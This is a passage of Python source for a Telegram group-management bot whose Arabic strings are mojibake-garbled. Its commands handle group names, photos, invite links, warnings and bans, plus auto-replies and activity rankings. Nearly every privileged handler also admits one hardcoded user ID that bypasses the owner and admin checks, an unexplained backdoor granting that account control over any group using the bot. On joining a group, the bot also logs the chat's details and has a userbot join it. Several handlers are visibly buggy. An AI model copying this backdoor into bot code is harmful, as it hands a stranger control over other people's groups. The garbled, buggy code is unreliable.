       ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø§Ù†", timeout=300)
       VEGAAA = ask.text
       chat_id = message.chat.id
       await app.set_chat_title(chat_id, VEGAAA)
       await message.reply_text(f"ï¸ØªÙ… ØªØºÙŠØ± Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨ ã€Œ {message.from_user.mention} ã€Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
   else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø§Ù„Ù…Ø§Ù„Ùƒ âœ¨")


# Ù…Ø³Ø­ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
# Ù…Ø³Ø­ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command("Ù…Ø³Ø­ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨", "") & filters.group, group=555580000250)
async def tasfaghddd(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER] or message.from_user.id == 8040979911:
        KIMMYY = ".."
        chat_id = message.chat.id
        if message.chat.title == KIMMYY:
            await message.reply("Ù‡ÙŠÙŠÙ‡ Ù…Ø§ÙÙŠÙ‡ Ø§Ø³Ù… Ù„Ø¬Ø±ÙˆØ¨ ÙŠØ§Ø±ÙˆØ¹!!")
        else:
            await client.set_chat_title(chat_id, KIMMYY)
            await message.reply_text(f"ØªÙ… Ù…Ø³Ø­ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨ ã€Œ {message.from_user.mention} ã€Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
    else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø§Ù„Ù…Ø§Ù„Ùƒ âœ¨")

#ØªØºÙŠØ± Ø¨Ø§ÙŠÙˆ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªØºÙŠØ± Ø¨Ø§ÙŠÙˆ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command("ØªØºÙŠØ± Ø¨Ø§ÙŠÙˆ Ø§Ù„Ø¬Ø±ÙˆØ¨", "") & filters.group, group=80087651300)
async def tasfayahshsh(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER] or message.from_user.id == 8040979911:
       ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø¨Ø§ÙŠÙˆ Ø§Ù„Ø§Ù†", timeout=100)
       VEGAAA = ask.text
       chat_id = message.chat.id
       await app.set_chat_description(chat_id, VEGAAA)
       await message.reply_text(f"ØªÙ… ØªØºÙŠØ± Ø¨Ø§ÙŠÙˆ Ø§Ù„Ø¬Ø±ÙˆØ¨ ã€Œ {message.from_user.mention} ã€Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
   else:
        await message.reply("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø§Ù„Ù…Ø§Ù„Ùƒ âœ¨")
        
        
        
        
        
#ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø­Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø­Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command("ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨", "") & filters.group & filters.group, group=287272828)
async def tasfaghhhgya(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
        ask = await client.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ù„Ù€ÙŠ ØµÙˆØ±Ù‡ Ø§Ù„Ø§Ù†", filters=filters.photo, timeout=100)
        photo = ask.photo.file_id if ask.photo else None
        if photo:
            chat_id = message.chat.id
            await client.set_chat_photo(chat_id=chat_id, photo=photo)
            await message.reply_text(f"ï¸ØªÙ… ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨ ã€Œ {message.from_user.mention} ã€Ø¨Ù†Ø¬Ø§Ø­ âœ¨ ")
        else:
            await message.reply_text("Ù„Ù… ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø©. ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©.")
    else:
        await message.reply_text("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")


#Ù…Ø³Ø­ ØµÙˆØ±Ù‡ Ø§Ù„Ø­Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#Ù…Ø³Ø­ ØµÙˆØ±Ù‡ Ø§Ù„Ø­Ø±ÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command("Ù…Ø³Ø­ ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨", "") & filters.group & filters.group, group=28727282883737)
async def tasfaghhhgyahddh(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
     if message.chat.photo:
         photo = await client.download_media(message.chat.photo.big_file_id)    
         await app.delete_chat_photo(message.chat.id)
         await client.send_photo(chat_id=message.chat.id, photo=photo, caption=f"<b>[Ø³Ùˆà¢ªØ³ ÙÙŠà¢ªÙˆï¬¸ | ğ™ğ™¤ğ™ªğ™§ğ™˜ğ™š ğ™‘ğ™šğ™§ğ™¤ğ™£. #]\n ØªÙ… Ù…Ø³Ø­ ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨ âœ¨\n Ø¨ÙˆØ§Ø³Ø·Ø©: {message.from_user.mention}</b>")
     else:
        await message.reply_text("Ù‡ÙŠÙŠÙ‡ Ù…Ø§ÙÙŠÙ‡ ØµÙˆØ±Ù‡ Ù„Ø¬Ø±ÙˆØ¨ ÙŠØ§Ø±ÙˆØ¹!!")
    else:
        await message.reply_text("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")



#ØªÙ†Ø¨ÙŠÙ‡ Ø¨ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªÙ†Ø¨ÙŠÙ‡ Ø¨ØªØºÙŠØ± ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.new_chat_photo & filters.group, group=8292)
async def changephoto(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    chat_id = message.chat.id
    photo = await client.download_media(message.chat.photo.big_file_id)
    response = f"<b>[Ø³Ùˆà¢ªØ³ ÙÙŠà¢ªÙˆï¬¸ | ğ™ğ™¤ğ™ªğ™§ğ™˜ğ™š ğ™‘ğ™šğ™§ğ™¤ğ™£. #]\n Ø²ÙˆÙ‚Ùƒ Ø­Ù„Ùˆ : {message.from_user.mention} \n Ø­Ù„ÙˆÙ‡ ØµÙˆØ±Ù‡ Ø§Ù„Ø¬Ø±ÙˆØ¨ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ù‡ </b>"
    await message.reply_photo(photo=photo, caption=response)
    
    



#ØªÙ†Ø¨ÙŠÙ‡ Ø¨ØªØºÙŠØ± Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#ØªÙ†Ø¨ÙŠÙ‡ Ø¨ØªØºÙŠØ± Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.new_chat_title & filters.group, group=8282828292)
async def changephoto(client, message):
    chat_id = message.chat.id
    await message.reply_text("<b>[Ø³Ùˆà¢ªØ³ ÙÙŠà¢ªÙˆï¬¸ | ğ™ğ™¤ğ™ªğ™§ğ™˜ğ™š ğ™‘ğ™šğ™§ğ™¤ğ™£. #]\n Ø²ÙˆÙ‚Ùƒ Ø­Ù„Ùˆ : {message.from_user.mention}\n Ø­Ù„ÙˆÙ‡ Ø§Ø³Ù… Ø§Ù„Ø¬Ø±ÙˆØ¨ Ø§Ù„Ø¬Ø¯ÙŠØ¯ </b>")


#Ø§Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø·  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#Ø§Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø·  â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


@app.on_message(filters.command(["Ø±Ø§Ø¨Ø·","Ø§Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø·","Ù„ÙŠÙ†Ùƒ"], "") & filters.group & filters.group, group=283277)
async def create_invite_link(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == OWNER_ID or message.from_user.id == 8040979911:
        link = await client.create_chat_invite_link(message.chat.id)
        await client.send_message(
            chat_id=message.chat.id,
            text=f"ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ù„Ù„Ø¬Ø±ÙˆØ¨ :\n {link.invite_link}"
        )
    else:
        await message.reply_text("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")
    






#Ø§Ù†Ø°Ø§Ø± â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#Ø§Ù†Ø°Ø§Ø± â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


enzyof = []
@app.on_message(filters.command(["Ù‚ÙÙ„ Ø§Ù†Ø°Ø§Ø±", "ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø§Ù†Ø°Ø§Ø±"], "") & filters.group, group=27727181882)
async def enzylock(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == OWNER_ID or message.from_user.id == 8040979911:
      if message.chat.id in enzyof:
        return await message.reply_text("Ø§Ù„Ø§Ù†Ø°Ø§Ø± Ù…Ø¹Ø·Ù„ Ø§ØµÙ„Ø§ âœ¨")
      enzyof.append(message.chat.id)
      return await message.reply_text("ØªÙ… ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø§Ù†Ø°Ø§Ø± Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
   else:
      return await message.reply_text("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")

@app.on_message(filters.command(["ÙØªØ­ Ø§Ù†Ø°Ø§Ø±", "ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§Ù†Ø°Ø§Ø±"], "") & filters.group, group=7262627288)
async def enzyopen(client, message):
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 8040979911:
      if not message.chat.id in enzyof:
        return await message.reply_text("Ø§Ù„Ø§Ù†Ø°Ø§Ø± Ù…ØªÙØ¹Ù„ Ø§ØµÙ„Ø§ âœ¨")
      enzyof.remove(message.chat.id)
      return await message.reply_text("ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§Ù†Ø°Ø§Ø± Ø¨Ù†Ø¬Ø§Ø­ âœ¨")
   else:
      return await message.reply_text("Ù„Ø§Ø²Ù… ØªÙƒÙˆÙ† Ø¹ Ø§Ù„Ø§Ù‚Ù„ Ø§Ø¯Ù…Ù† Ø§Ùˆ Ø§Ø¹Ù„ÙŠ âœ¨")




sohaila = {}
kem_vee = 3

@app.on_message(filters.command(["Ø§Ù†Ø°Ø§Ø±"], "") & filters.group, group=466670090009885)
async def tom(client, message):
    if message.chat.id in enzyof:
        return await message.reply_text("<b>Ø§Ù„Ø§Ù†Ø°Ø§Ø± Ù…Ø¹Ø·Ù„ Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ø§Ø¯Ù…Ù†âœ¨</b>")
    
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == OWNER_ID or message.from_user.id == 8040979911:
        me = message.from_user.id
        user_id = message.reply_to_message.from_user.id
        chat_id = message.chat.id
        
        if chat_id not in sohaila:
            sohaila[chat_id] = {}
        
        if user_id not in sohaila[chat_id]:
            sohaila[chat_id][user_id] = 1
        else:
            sohaila[chat_id][user_id] += 1
        
        await message.reply_text(f"{sohaila[chat_id][user_id]}")
        
        if sohaila[chat_id][user_id] >= kem_vee:
            try:
                del sohaila[chat_id][user_id]
                await client.ban_chat_member(chat_id, user_id)
                await message.reply("Ù‡Ø·Ù„Ø¹ Ø§Ù„ÙƒÙ„Ø¨ Ø¯Ø§ Ø¨Ø±Ù‡ Ù…Ø´ Ø¨ÙŠØ³Ù…Ø¹ Ø§Ù„ÙƒÙ„Ø§Ù…..Ø·Ø±Ø¯")    
            except:
                await message.reply("Ù…Ø´ Ø¹Ø§Ø±Ù Ø§Ø·Ø±Ø¯Ùˆ Ù…Ø¹Ù‡ Ø­ØµØ§Ù†Ù‡")


#Ø§Ù„ØªÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“
#Ø§Ù„ØªÙˆØ¨ â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“


message_counts = {}

@app.on_message(filters.group & filters.group, group=55727211005)
async def update_message_count(_, message):
    group_id = message.chat.id
    user_id = message.from_user.id if message.from_user else "1121532100"
    
    key = (group_id, user_id)
    message_counts.setdefault(key, 0)
    message_counts[key] += 1

async def get_user_name(client, user_id):
    user = await client.get_users(user_id)
    return f"{user.first_name or ''} {user.last_name or ''}"

@app.on_message(filters.command("ØªØ±Ù†Ø¯", "") & filters.group & filters.group, group=55559190191)
async def get_top_users(client, message):
    group_id = message.chat.id   
    top_users = sorted(message_counts.items(), key=lambda x: x[1], reverse=True)[:5]
    response = "<u>Ø§ÙØ¶Ù„ Ø¹Ø´Ø± Ù…ØªÙØ§Ø¹Ù„ÙŠÙ†:</u>\n\n"   
    for rank, ((group_id, user_id), message_count) in enumerate(top_users[:3], start=1):
        user_name = await get_user_name(client, user_id)
        medal = "ğŸ¥‡" if rank == 1 else "ğŸ¥ˆ" if rank == 2 else "ğŸ¥‰"
        response += f"{medal} {rank} : {user_name} | {message_count} â¥ Ø±Ø³Ø§ÙŠÙ„\n"  
    for rank, ((group_id, user_id), message_count) in enumerate(top_users[3:], start=4):
        user_name = await get_user_name(client, user_id)
        response += f"{rank} : {user_name} | {message_count}\n â¥ Ø±Ø³Ø§ÙŠÙ„\n"      
    await client.send_message(message.chat.id, response)





import random

ALI = ["ğŸ‘", "â¤", "ğŸ”¥", "ğŸ¥°", "ğŸ‰", "ğŸ¤©", "ğŸ™", "ğŸ‘Œ", "ğŸ•Š", "ğŸ˜", "ğŸ˜","ğŸ“","ğŸ’‹","ğŸ’˜","ğŸŒš"]

@app.on_message(filters.channel, group=12567)
async def handle_message(client, message):
    bot_username = client.me.username
    user = await get_assistant(bot_username)
    chat_id = message.chat.id
    message_id = message.id
    T = random.choice(ALI)
    try:
        await user.send_reaction(chat_id, message_id, f"{T}")
    except Exception as e:
        print(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù…: {str(e)}")

@app.on_message(filters.new_chat_members)
async def join_watcher(_, message):
    try:
        if not await is_on_off(LOG):
            return
        userbot = await get_assistant(message.chat.id)
        chat = message.chat
        for members in message.new_chat_members:
            if members.id == app.id:
                count = await app.get_chat_members_count(chat.id)
                username = (
                    message.chat.username if message.chat.username else "á´˜Ê€Éªá´ á´€á´›á´‡ á´„Êœá´€á´›"
                )
                msg = (
                    f"<b>ØªÙ… Ø§Ø¶Ø§ÙØ© Ø§Ù„Ø¨ÙˆØª Ø§Ù„ÙŠ Ù…Ø¬Ù…ÙˆØ¹Ø© Ø¬Ø¯ÙŠØ¯Ù‡ :</b>\n\n"
                    f"â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
                    f"<b>â•­â–ášá´„Êœá´€á´› É´á´€á´á´‡ :</b> {message.chat.title}\n"
                    f"<b>â”‚ášœâ–á´„Êœá´€á´› Éªá´… :</b> {message.chat.id}\n"
                    f"<b>â”‚ášœâ–á´„Êœá´€á´› á´œsá´‡Ê€É´á´€á´á´‡ :</b> @{username}\n"
                    f"<b>â”‚ášœâ–á´„Êœá´€á´› á´á´‡á´Ê™á´‡Ê€ á´„á´á´œÉ´á´› :</b> {count}\n"
                    f"<b>â•°â–ášá´€á´…á´…á´‡á´… Ê™Ê :</b> {message.from_user.mention}"
                )
                await app.send_message(
                    LOGGER_ID,
                    text=msg,
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    f"á´€á´…á´…á´‡á´… Ê™Ê",
                                    url=f"tg://openmessage?user_id={message.from_user.id}",
                                )
                            ]
                        ]
                    ),
                )
                await userbot.join_chat(f"{username}")
    except Exception as e:
        print(f"Error: {e}")


@app.on_message(filters.left_chat_member)
async def on_left_chat_member(_, message: Message):
    try:
        if not await is_on_off(LOG):
            return
        userbot = await get_assistant(message.chat.id)

        left_chat_member = message.left_chat_member
        if left_chat_member and left_chat_member.id == app.id:
            remove_by = (
                message.from_user.mention if message.from_user else "ğ”É´á´‹É´á´á´¡É´ ğ”sá´‡Ê€"
            )
            title = message.chat.title
            username = (
                f"@{message.chat.username}" if message.chat.username else "á´˜Ê€Éªá´ á´€á´›á´‡ á´„Êœá´€á´›"
            )
            chat_id = message.chat.id
            left = f"âœ« <b><u>#ØªÙ… Ø·Ø±Ø¯ Ø§Ù„Ø¨ÙˆØª </u></b> \nâ•­â–ášá´„Êœá´€á´› É´á´€á´á´‡ : {title}\nâ”‚ášœâ– á´„Êœá´€á´› Éªá´… : {chat_id}\nâ•°â–ášnÊ€á´‡á´á´á´ á´‡á´… Ê™Ê : {remove_by}"
            await app.send_message(LOGGER_ID, text=left)
            await delete_served_chat(chat_id)
            await userbot.leave_chat(chat_id)
    except Exception as e:
        print(f"Error: {e}")







rdod = {}
answer = {}
respon = {}

@app.on_message(filters.regex("Ø§Ø¶Ù Ø±Ø¯"), group=1289712474)
async def lock_vaassd(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
        user_id = message.from_user.id if message.from_user else "1121532100"
        ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø§Ù„ÙƒÙ„Ù…Ù‡ Ø§Ù„Ø§Ù†", timeout=300)
        message1 = ask.text
        ask = await app.ask(message.chat.id, "Ø§Ø±Ø³Ù„ Ø§Ù„Ø±Ø¯ Ø§Ù„Ø§Ù†", timeout=300)
        answer_text = ask.text
        answer.setdefault(message.chat.id, []).append(message1)
        respon.setdefault(message.chat.id, []).append(answer_text)
        rdod[message.chat.id] = True
        await asyncio.sleep(6)
        await message.reply_text(f"â€¢ ØªÙ… Ø§Ø¶Ø§ÙÙ‡ Ø±Ø¯ Ø¨ÙˆØ§Ø³Ø·Ù‡ â†¤ã€Œ {message.from_user.mention}ã€")


@app.on_message(filters.text, group=1478212474)
async def delet_mediaaa(client, message):
    if message.chat.id in rdod and rdod[message.chat.id]:
        if message.text in answer.get(message.chat.id, []):
            index = answer[message.chat.id].index(message.text)
            response_text = respon[message.chat.id][index]
            await message.reply_text(response_text)

        
@app.on_message(filters.command("Ø§Ù„Ø±Ø¯ÙˆØ¯", ""),group=4557857)
async def rdods(client, message: Message):
    try:
        index = answer[message.chat.id]
        response_text = respon[message.chat.id]
        text = "\n".join(f"{keyword}: {responses}" for keyword, responses in zip(index, response_text))
        await message.reply_text(text)
    except:
        await message.reply_text("Ù„Ø§ ØªÙˆØ¬Ø¯ Ø±Ø¯ÙˆØ¯ Ù…Ø³Ø¬Ù„Ø©.")



@app.on_message(filters.command("Ù…Ø³Ø­ Ø§Ù„Ø±Ø¯ÙˆØ¯", ""), group=45577857)
async def clear_responses(client, message: Message):
    if message.chat.id not in answer or not answer[message.chat.id]:
        await message.reply_text("Ù„Ø§ ØªÙˆØ¬Ø¯ Ø±Ø¯ÙˆØ¯ Ù…Ø³Ø¬Ù„Ø© Ù„Ø¥Ø²Ø§Ù„ØªÙ‡Ø§.")
        return
    del answer[message.chat.id]
    del respon[message.chat.id]
    await message.reply_text("ØªÙ… Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ø¯ÙˆØ¯.")

@app.on_message(filters.regex("Ù…Ø³Ø­ Ø±Ø¯"), group=1289712475)
async def delete_response(client, message):
    get = await client.get_chat_member(message.chat.id, message.from_user.id)
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
        ask = await app.ask(message.chat.id, "Ø§Ø¯Ø®Ù„ Ø§Ù„ÙƒÙ„Ù…Ù‡ Ø§Ù„ØªÙŠ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø§Ù„Ø±Ø¯ Ù„Ù‡Ø§", timeout=300)
        keyword = ask.text
        if keyword in answer.get(message.chat.id, []):
            index = answer[message.chat.id].index(keyword)
            answer[message.chat.id].pop(index)
            respon[message.chat.id].pop(index)
            await message.reply_text(f"â€¢ ØªÙ… Ø­Ø°Ù Ø§Ù„Ø±Ø¯ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨ÙƒÙ„Ù…Ø© â†¤ï¸ã€Œ {keyword}ã€")
        else:
            await message.reply_text("â€¢ Ø§Ù„ÙƒÙ„Ù…Ø© ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ø§Ù„Ø±Ø¯ÙˆØ¯.")
